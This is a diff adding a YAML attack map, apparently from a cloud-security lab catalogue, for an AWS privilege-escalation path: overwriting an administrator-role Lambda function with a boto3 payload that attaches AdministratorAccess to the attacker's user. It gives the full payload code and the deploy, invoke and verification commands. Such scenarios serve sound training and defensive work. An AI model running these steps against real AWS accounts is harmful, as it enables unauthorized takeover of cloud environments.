@@ -1,0 +1,84 @@
+attackMap:
+  nodes:
+    - id: starting-principal
+      label: "Starting User"
+      type: principal
+      subType: iam-user
+      arn: "arn:aws:iam::{account_id}:user/pl-prod-lambda-003-to-admin-starting-user"
+      description: >
+        You have gained access to this principal's AWS IAM credentials. These could
+        have been obtained through many real-world vectors: phishing a developer and
+        gaining access to their workstation, compromising a browser session, exploiting
+        a vulnerable workload running in this AWS account, discovering credentials in
+        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.
+
+        Regardless of how you obtained them, you are now operating as this principal.
+        This IAM user has lambda:UpdateFunctionCode and lambda:InvokeFunction permissions
+        on a pre-existing Lambda function whose execution role has AdministratorAccess.
+
+    - id: target-lambda
+      label: "Target Lambda"
+      type: resource
+      subType: lambda-function
+      arn: "arn:aws:lambda:{region}:{account_id}:function/pl-prod-lambda-003-to-admin-target-lambda"
+      description: >
+        This Lambda function currently runs benign code. Its execution role has
+        AdministratorAccess. By replacing the function code with a malicious payload
+        and invoking it, you can leverage the execution role to escalate your own privileges.
+
+    - id: target-admin
+      label: "Admin Role"
+      type: principal
+      subType: iam-role
+      isTarget: true
+      arn: "arn:aws:iam::{account_id}:role/pl-prod-lambda-003-to-admin-target-role"
+      description: >
+        This Lambda execution role has AdministratorAccess. When the malicious payload
+        executes under this role, it calls iam:AttachUserPolicy to grant the starting
+        user AdministratorAccess, achieving full administrative access to the AWS account.
+
+  edges:
+    - from: starting-principal
+      to: target-lambda
+      label: "lambda:UpdateFunctionCode"
+      description: >
+        Replace the Lambda function's existing code with a malicious payload that
+        calls iam:AttachUserPolicy to grant the starting user AdministratorAccess.
+      hints:
+        - "You can modify the code of existing Lambda functions."
+        - "Look for Lambda functions whose execution roles have elevated permissions."
+        - "Browse to https://pathfinding.cloud/paths/lambda-003 for technique details."
+      commands:
+        - description: "Create malicious Lambda function code"
+          command: |
+            cat > /tmp/lambda_function.py << 'EOF'
+            import boto3
+            import json
+
+            def lambda_handler(event, context):
+                iam = boto3.client('iam')
+                iam.attach_user_policy(
+                    UserName=event['username'],
+                    PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
+                )
+                return {'statusCode': 200, 'body': json.dumps('Privilege escalation successful')}
+            EOF
+        - description: "Package and deploy the malicious code"
+          command: "cd /tmp && zip malicious_payload.zip lambda_function.py && aws lambda update-function-code --function-name pl-prod-lambda-003-to-admin-target-lambda --zip-file fileb://malicious_payload.zip"
+
+    - from: target-lambda
+      to: target-admin
+      label: "lambda:InvokeFunction + iam:AttachUserPolicy"
+      description: >
+        Invoke the Lambda function with a payload specifying the target username.
+        The function executes under its privileged execution role and attaches
+        AdministratorAccess to the starting user.
+      hints:
+        - "This function's execution role has administrative permissions."
+        - "Update the function code to include a payload that grants your user admin access."
+        - "After updating, invoke the function to trigger your payload."
+      commands:
+        - description: "Invoke the malicious Lambda function"
+          command: "aws lambda invoke --function-name pl-prod-lambda-003-to-admin-target-lambda --payload '{\"username\": \"pl-prod-lambda-003-to-admin-starting-user\"}' /tmp/response.json"
+        - description: "Verify administrator access"
+          command: "aws iam list-attached-user-policies --user-name pl-prod-lambda-003-to-admin-starting-user"
